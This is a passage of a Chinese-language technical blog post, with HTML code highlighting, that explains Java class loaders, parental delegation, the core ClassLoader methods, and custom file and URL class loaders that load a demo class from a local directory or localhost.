class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ClassLoader cl = Object<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">  System.out.println(cl); <span class="comment">//根类加载器打印出来的结果是null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是打印出<code>null</code>的原因是由于<code>BootStrapClassLoader</code>是用c++写的，使用原生代码来实现，并不继承于<code>java.lang.ClassLoader</code>，所以在返回该<code>ClassLoader</code>时就会返回<code>null</code>。</p><h6 id="扩展类加载器-Extension"><a href="#扩展类加载器-Extension" class="headerlink" title="扩展类加载器(Extension)"></a>扩展类加载器(Extension)</h6><p>扩展类加载器是指原SUN公司实现的<code>sun.misc.launcher$ExtClassLoader</code>类(JDK8)，它是由java语言编写，父加载器是根类加载器，负责加载<code>&lt;JAVA_HOME&gt;\jre\lib\ext</code>目录下的类库或者系统变量<code>java.ext.dirs</code>指定的目录下的类库。</p><p>测试<code>dnsns.jar</code>下类的类加载器，因为该<code>jar</code>包在<code>jre\lib\ext</code>目录下</p><p><img src="/2021/10/30/Java类加载/2.png" alt="2"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = DNSNameService<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"DNSNameService类的类加载器是: "</span>+classLoader1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/30/Java类加载/3.png" alt="3"></p><h6 id="系统类加载器-System"><a href="#系统类加载器-System" class="headerlink" title="系统类加载器(System)"></a>系统类加载器(System)</h6><p>系统类加载器也称之为应用类加载器，也是纯Java类，是原SUN公司实现的<code>sun.misc.Launcher$AppClassLoader</code>类(JDK8)。它的父加载器是扩展类加载器，它负责从<code>classpath</code>环境变量或者系统属性<code>java.class.path</code>所指定的目录中加载类，它是用户自定义的类加载器的默认父加载器。一般情况下，该类加载器是程序中默认的类加载器，可以通过<code>ClassLoader.getSystemClassLoader()</code>直接获得</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = ClassLoaderTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"ClassLoaderTest类的类加载器是: "</span>+classLoader1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自己编写的类使用的类加载器结果为<code>sun.misc.Launcher$AppClassLoader</code></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>在程序开发中，类的加载几乎是由上述3种类加载器相互配合执行的，同时我们还可以自定义类加载器。需要注意的是，Java虚拟机对<code>class</code>文件采用的是按需加载的方式，也就是说当需要使用该类时才会将它的<code>class</code>文件加载到内存生成<code>class</code>对象，而且加载某个类的<code>class</code>文件时，Java虚拟机采用的是双亲委派模式，即把加载类的请求交由父加载器处理，它是一种任务委派模式。</p><h4 id="类加载器的双亲委派机制"><a href="#类加载器的双亲委派机制" class="headerlink" title="类加载器的双亲委派机制"></a>类加载器的双亲委派机制</h4><p>除了根类加载器之外，其他的类加载器都需要有自己的父加载器。从<code>JDK1.2</code>开始，类的加载过程采用双亲委派机制，这种机制能够很好的保护Java程序的安全，除了虚拟机自带的根类加载器之外，其余的类加载器都有唯一的父加载器，比如，如果需要<code>ClassLoader</code>加载一个类时，该<code>ClassLoader</code>先委托自己的父加载器先去加载这个类，若父加载器能够加载，则由父加载器加载，否则才由<code>ClassLoader</code>自己加载这个类。真正加载类的加载器我们叫做启动类加载器，注意，双亲委派机制的父子关系并非面向对象程序设计中的继承关系，而是通过使用组合模式来复用父加载器代码，这种机制如下图所示</p><p><img src="/2021/10/30/Java类加载/4.png" alt="4"></p><p>测试自定义类的类加载器的父子关系，通过<code>getParent()</code>来获取父类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader = ClassLoaderTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"ClassLoaderTest类的类加载器是: "</span>+classLoader);</span><br><span class="line">        <span class="keyword">while</span> (classLoader!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.println(classLoader);</span><br><span class="line">            classLoader = classLoader.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印出的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassLoaderTest类的类加载器是: sun.misc.Launcher$AppClassLoader</span><br><span class="line">sun.misc.Launcher$AppClassLoader</span><br><span class="line">sun.misc.Launcher$ExtClassLoader</span><br></pre></td></tr></table></figure><h5 id="双亲委派机制的好处"><a href="#双亲委派机制的好处" class="headerlink" title="双亲委派机制的好处"></a>双亲委派机制的好处</h5><ul><li>可以避免类的重复加载，当父类加载器已经加载了该类时，就没有必要子<code>ClassLoader</code>再加载一次。</li><li>考虑到安全因素，Java核心<code>API</code>种定义类型不会被随意替换，假设通过网络传递一个名为<code>java.lang.Object</code>的类，通过双亲委派模式传递到启动类加载器，而启动类加载器在Java核心<code>API</code>发现这个名字的类，发现该类已经被加载，并不会重新加载网络传递过来的<code>java.lang.Object</code>，而直接返回已加载过的<code>Objec.class</code>，这样便可以防止核心<code>API</code>库被随意篡改。</li></ul><h4 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h4><p>所有的类加载器(除了根类加载器)都必须继承<code>java.lang.ClassLoader</code>，它是一个抽象类，主要的方法如下</p><h5 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h5><p>在<code>ClassLoader</code>的源码中，有一个方法<code>loadClass(String name, boolean resolve)</code>，这里就是双亲委派模式的代码实现。从源码中我们可以观察到它的执行顺序，需要注意的是，只有父类加载器加载不到类时，会调用<code>findClass</code>方法进行类的查找，所以在定义自己的类加载器时，不要覆盖掉该方法，而应该覆盖掉<code>findClass</code>方法。</p><p><code>ClassLoader</code>类的<code>loadClass</code>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码中，首先会通过<code>findLoadClass</code>方法检查类是否已经被加载。如果没有被加载，就会执行双亲委派模式，通过父类去加载，即在父类上调用<code>loadClass</code>方法，如果父类加载不到的话，则使用虚拟机的内置类加载器，如果都没有加载成功，就会通过自己的<code>findClass</code>方法去加载。</p><h5 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h5><p>在自定义类加载器时，一般我们需要覆盖这个方法，且<code>ClassLoader</code>中给出了一个默认的错误实现。如果我们覆盖了这个方法，则会调用我们自己写的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><p>该方法用来将<code>byte</code>字节解析成虚拟机能够识别的<code>Class</code>对象，<code>defineClass()</code>方法通常与<code>findClass()</code>方法一起使用。在自定义类加载器时，会直接覆盖<code>ClassLoader</code>的<code>findClass()</code>方法获取要加载类的字节码，然后调用<code>defineClass()</code>方法生成<code>Class</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(name, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h5><p>连接指定的类，类加载器可以使用此方法来连接类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>在<code>java.net</code>包中，JDK提供了一个更加易用的类加载器<code>URLClassLoader</code>，它扩展了<code>ClassLoader</code>，能够从本地或者网络上指定的位置加载类，我们可以使用该类作为自定义的类加载器使用。</p><p>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> URLClassPath(urls, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>指定要加载的类所在的URL地址，父类加载器默认认为系统类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls, ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> URLClassPath(urls, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>指定要加载的类所在的URL地址，并指定父类加载器。</p><h5 id="使用URLClassLoader加载本地类"><a href="#使用URLClassLoader加载本地类" class="headerlink" title="使用URLClassLoader加载本地类"></a>使用URLClassLoader加载本地类</h5><p>创建一个<code>Demo</code>类如下，路径为<code>/Users/caoyifan/</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> elssm.test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"demo instance"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译该类</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . Demo.java</span><br></pre></td></tr></table></figure><p>接着使用自己写的类去加载<code>Demo</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        URI uri = file.toURI();</span><br><span class="line">        URL url = uri.toURL();</span><br><span class="line"></span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        System.out.println(<span class="string">"父类加载器："</span>+classLoader.getParent());</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">父类加载器：sun.misc.Launcher$AppClassLoader@<span class="number">7f</span>31245a</span><br><span class="line">demo instance</span><br></pre></td></tr></table></figure><h5 id="使用URLClassLoader加载网络上的类"><a href="#使用URLClassLoader加载网络上的类" class="headerlink" title="使用URLClassLoader加载网络上的类"></a>使用URLClassLoader加载网络上的类</h5><p>Mac上Apache服务器默认的web根目录在：<code>/Library/WebServer/Documents</code>，我们可以将<code>Demo</code>；类放在该目录下进行加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://localhost:80/"</span>);</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h4><h5 id="自定义文件类加载器"><a href="#自定义文件类加载器" class="headerlink" title="自定义文件类加载器"></a>自定义文件类加载器</h5><ul><li>继承<code>ClassLoader</code>类</li><li>覆盖<code>findClass</code>方法</li></ul><p>具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFileClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String directory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFileClassLoader</span><span class="params">(String directory)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFileClassLoader</span><span class="params">(String directory,ClassLoader parent)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="keyword">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//把类名转换为目录</span></span><br><span class="line">            String file = directory + File.separator+name.replace(<span class="string">"."</span>,File.separator)+<span class="string">".class"</span>;</span><br><span class="line">            <span class="comment">//构建输入流</span></span><br><span class="line">            InputStream in = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            <span class="comment">//构建字节输出流</span></span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((len = in.read(buf))!= -<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span> data[] = baos.toByteArray(); <span class="comment">//读取到的字节码的二进制数据</span></span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        Class clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="自定义网络类加载器"><a href="#自定义网络类加载器" class="headerlink" title="自定义网络类加载器"></a>自定义网络类加载器</h5><p>具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyURLClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyURLClassLoader</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String path = url+<span class="string">"/"</span>+name.replace(<span class="string">"."</span>,<span class="string">"/"</span>)+<span class="string">".class"</span>;</span><br><span class="line">            URL url = <span class="keyword">new</span> URL(path);</span><br><span class="line">            InputStream in = url.openStream();</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len=in.read(buf))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] data = baos.toByteArray();</span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyURLClassLoader classLoader = <span class="keyword">new</span> MyURLClassLoader(<span class="string">"http://localhost:80"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="热部署类加载器"><a href="#热部署类加载器" class="headerlink" 